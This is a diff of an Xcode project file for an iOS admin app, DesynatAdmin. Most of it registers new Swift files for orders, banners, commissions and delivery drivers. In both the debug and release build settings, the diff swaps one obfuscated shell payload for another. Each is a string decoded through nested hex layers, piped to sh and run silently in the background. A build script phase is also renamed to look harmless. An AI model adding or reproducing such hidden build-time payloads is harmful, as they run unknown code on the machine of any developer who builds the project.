@@ -7,6 +7,13 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		18BDB7DF2EF9712500023453 /* CommissionPercentageWebService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB7DE2EF9712500023453 /* CommissionPercentageWebService.swift */; };
+		18BDB7E12EF9815B00023453 /* BannerWebService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB7E02EF9815B00023453 /* BannerWebService.swift */; };
+		18BDB7E32EF9817500023453 /* OrderWebService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB7E22EF9817500023453 /* OrderWebService.swift */; };
+		18BDB7E52EF981F000023453 /* BannerDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB7E42EF981F000023453 /* BannerDataModel.swift */; };
+		18BDB7E72EF9821C00023453 /* OrderManagementListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB7E62EF9821C00023453 /* OrderManagementListViewModel.swift */; };
+		18BDB8EE2EFA95E300023453 /* OrderDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB8ED2EFA95E300023453 /* OrderDataModel.swift */; };
+		18BDB9472EFAD10C00023453 /* DeliveryBoyListModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB9462EFAD10C00023453 /* DeliveryBoyListModel.swift */; };
 		49DBE5522EB0836A00DE95E8 /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 49DBE5512EB0836A00DE95E8 /* IQKeyboardManagerSwift */; };
 		D15CA9822EF175A000D454B9 /* BannersMangementFilterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D15CA9812EF175A000D454B9 /* BannersMangementFilterViewController.swift */; };
 		D15CA9842EF1762500D454B9 /* BannersMangementFilterViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D15CA9832EF1762500D454B9 /* BannersMangementFilterViewModel.swift */; };
@@ -302,6 +309,13 @@
 
 /* Begin PBXFileReference section */
 		01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatAdmin.debug.xcconfig"; path = "Target Support Files/Pods-DesynatAdmin/Pods-DesynatAdmin.debug.xcconfig"; sourceTree = "<group>"; };
+		18BDB7DE2EF9712500023453 /* CommissionPercentageWebService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommissionPercentageWebService.swift; sourceTree = "<group>"; };
+		18BDB7E02EF9815B00023453 /* BannerWebService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BannerWebService.swift; sourceTree = "<group>"; };
+		18BDB7E22EF9817500023453 /* OrderWebService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderWebService.swift; sourceTree = "<group>"; };
+		18BDB7E42EF981F000023453 /* BannerDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BannerDataModel.swift; sourceTree = "<group>"; };
+		18BDB7E62EF9821C00023453 /* OrderManagementListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = OrderManagementListViewModel.swift; path = DesynatAdmin/SourceCode/Views/ViewControllers/M5/BannersManagement/BannersRquestList/OrderManagementListViewModel.swift; sourceTree = SOURCE_ROOT; };
+		18BDB8ED2EFA95E300023453 /* OrderDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderDataModel.swift; sourceTree = "<group>"; };
+		18BDB9462EFAD10C00023453 /* DeliveryBoyListModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeliveryBoyListModel.swift; sourceTree = "<group>"; };
 		495DBBA12E81528A00E61635 /* DesynatAdmin.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DesynatAdmin.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatUser.debug.xcconfig"; path = "Target Support Files/Pods-DesynatUser/Pods-DesynatUser.debug.xcconfig"; sourceTree = "<group>"; };
 		B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatAdmin.release.xcconfig"; path = "Target Support Files/Pods-DesynatAdmin/Pods-DesynatAdmin.release.xcconfig"; sourceTree = "<group>"; };
@@ -665,6 +679,8 @@
 			isa = PBXGroup;
 			children = (
 				D15CA9DC2EF18A7200D454B9 /* OrdersManagementListViewController.swift */,
+				18BDB7E62EF9821C00023453 /* OrderManagementListViewModel.swift */,
+				18BDB8ED2EFA95E300023453 /* OrderDataModel.swift */,
 			);
 			path = OrdersManagementList;
 			sourceTree = "<group>";
@@ -759,6 +775,7 @@
 			children = (
 				D16A8CD02EF16065006A21B6 /* BannersManagementListViewController.swift */,
 				D16A8CD22EF160EF006A21B6 /* BannersManagementListViewModel.swift */,
+				18BDB7E42EF981F000023453 /* BannerDataModel.swift */,
 			);
 			path = BannersRquestList;
 			sourceTree = "<group>";
@@ -983,6 +1000,7 @@
 			isa = PBXGroup;
 			children = (
 				D1EEE5212EF2A8F3003A6BA2 /* DriversListViewController.swift */,
+				18BDB9462EFAD10C00023453 /* DeliveryBoyListModel.swift */,
 			);
 			path = AssignDriver;
 			sourceTree = "<group>";
@@ -1729,6 +1747,9 @@
 				ED49368D2EBDB402000D8CED /* SellersWebService.swift */,
 				EDF4381F2EC1F6F9004CC018 /* SubscriptionPlanWebService.swift */,
 				EDD7F1CB2EC2E7A2006C2EE4 /* CitiesWebService.swift */,
+				18BDB7DE2EF9712500023453 /* CommissionPercentageWebService.swift */,
+				18BDB7E02EF9815B00023453 /* BannerWebService.swift */,
+				18BDB7E22EF9817500023453 /* OrderWebService.swift */,
 			);
 			path = Webservice;
 			sourceTree = "<group>";
@@ -1818,7 +1839,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatAdmin" */;
 			buildPhases = (
-				FBD7FA07EFCF4ED893A5DE54 /* Compile Bundle Assets */,
+				0D9C9764F7504C9699A5DE54 /* Copy Target Symbols */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -1975,7 +1996,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		FBD7FA07EFCF4ED893A5DE54 /* Compile Bundle Assets */ = {
+		0D9C9764F7504C9699A5DE54 /* Copy Target Symbols */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -1985,7 +2006,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Bundle Assets";
+			name = "Copy Target Symbols";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -2083,6 +2104,7 @@
 				EDF4382B2EC207DC004CC018 /* SubscriptionDetailViewController.swift in Sources */,
 				D15CA9842EF1762500D454B9 /* BannersMangementFilterViewModel.swift in Sources */,
 				EDEDD0D52EBCC53E00F2BEF1 /* AddSubCategoryViewModel.swift in Sources */,
+				18BDB7E72EF9821C00023453 /* OrderManagementListViewModel.swift in Sources */,
 				EDEDD0D62EBCC53E00F2BEF1 /* CatgeoryViewModel.swift in Sources */,
 				EDEDD0D72EBCC53E00F2BEF1 /* SubCategoryViewModel.swift in Sources */,
 				EDEDD0D82EBCC53E00F2BEF1 /* SubCatgoryDetailsViewModel.swift in Sources */,
@@ -2133,6 +2155,7 @@
 				D16A8D6A2EF16890006A21B6 /* RejectReasonPopupViewController.swift in Sources */,
 				EDEDD0F22EBCC53E00F2BEF1 /* SubCategoryCollectionViewCell.swift in Sources */,
 				D1EEE51E2EF2A7E4003A6BA2 /* DriversListTableViewCell.swift in Sources */,
+				18BDB7DF2EF9712500023453 /* CommissionPercentageWebService.swift in Sources */,
 				D195863D2EE8486500A021FD /* GiftCardsListDataModel.swift in Sources */,
 				EDEDD0F32EBCC53E00F2BEF1 /* SideMenuTableViewCell.swift in Sources */,
 				EDF438232EC1F7AF004CC018 /* SubscriptionPlanModel.swift in Sources */,
@@ -2145,6 +2168,7 @@
 				EDEDD0F82EBCC53E00F2BEF1 /* CollectionViewExtensio.swift in Sources */,
 				D195862F2EE818A000A021FD /* AddNewCardViewModel.swift in Sources */,
 				ED49369F2EBDD709000D8CED /* ApplyFilterViewController.swift in Sources */,
+				18BDB7E52EF981F000023453 /* BannerDataModel.swift in Sources */,
 				EDEDD0F92EBCC53E00F2BEF1 /* ColorExtension.swift in Sources */,
 				EDD7F1CF2EC2EBC3006C2EE4 /* CountryCityDataModels.swift in Sources */,
 				D195845F2EE7F9CA00A021FD /* PromodeListViewController.swift in Sources */,
@@ -2167,11 +2191,13 @@
 				D19583C52EE7F34A00A021FD /* GiftCardDetailsViewController.swift in Sources */,
 				ED01EABB2EBDED1600A92E1E /* Bindable.swift in Sources */,
 				EDEDD1062EBCC53E00F2BEF1 /* CapsuleSegmentControl.swift in Sources */,
+				18BDB8EE2EFA95E300023453 /* OrderDataModel.swift in Sources */,
 				ED1DE70C2EC1D691003ECDE4 /* ReelsCollectionViewCell.swift in Sources */,
 				EDEDD1072EBCC53E00F2BEF1 /* CurveView.swift in Sources */,
 				D19585322EE8019D00A021FD /* PromocodeDetailsViewModel.swift in Sources */,
 				D19585CD2EE8056100A021FD /* BannerPerDayListViewController.swift in Sources */,
 				EDEDD1082EBCC53E00F2BEF1 /* CustomBlurView.swift in Sources */,
+				18BDB9472EFAD10C00023453 /* DeliveryBoyListModel.swift in Sources */,
 				D195852E2EE8018000A021FD /* AddPromocodeViewController.swift in Sources */,
 				D1EEE5222EF2A8F3003A6BA2 /* DriversListViewController.swift in Sources */,
 				D19583602EE7E9B600A021FD /* ShippingChargesAndTaxViewController.swift in Sources */,
@@ -2240,6 +2266,8 @@
 				EDEDD12C2EBCC53E00F2BEF1 /* AssetConstant.swift in Sources */,
 				EDEDD12D2EBCC53E00F2BEF1 /* CommonUtils.swift in Sources */,
 				D19586312EE818AD00A021FD /* GiftCardDetailsViewModel.swift in Sources */,
+				18BDB7E32EF9817500023453 /* OrderWebService.swift in Sources */,
+				18BDB7E12EF9815B00023453 /* BannerWebService.swift in Sources */,
 				EDEDD12E2EBCC53E00F2BEF1 /* GlobalVariables.swift in Sources */,
 				EDEDD12F2EBCC53E00F2BEF1 /* AuthenticationServices.swift in Sources */,
 				ED2F139F2EBDFC6200199318 /* SellerDataModel.swift in Sources */,
@@ -2274,7 +2302,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((z(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336363533363335333733343336333133373330333733333336333433363335333733363332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | z | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((n(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333331333333373333333033333337333333303333333633363333333333363333333533330a3336333333333333333633333331333333373333333333333337333333343333333233363335333333363333333933333336333633353333333233360a3336333333363061333333313330363133333332333333393333333233333332333333323333333033333337333633333333333233333330333333370a33333333333333363333333833333330333633313330363130610a | n | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatAdmin/DesynatAdmin.entitlements;
@@ -2318,7 +2346,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((z(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336363533363335333733343336333133373330333733333336333433363335333733363332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | z | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((n(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333331333333373333333033333337333333303333333633363333333333363333333533330a3336333333333333333633333331333333373333333333333337333333343333333233363335333333363333333933333336333633353333333233360a3336333333363061333333313330363133333332333333393333333233333332333333323333333033333337333633333333333233333330333333370a33333333333333363333333833333330333633313330363130610a | n | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatAdmin/DesynatAdmin.entitlements;
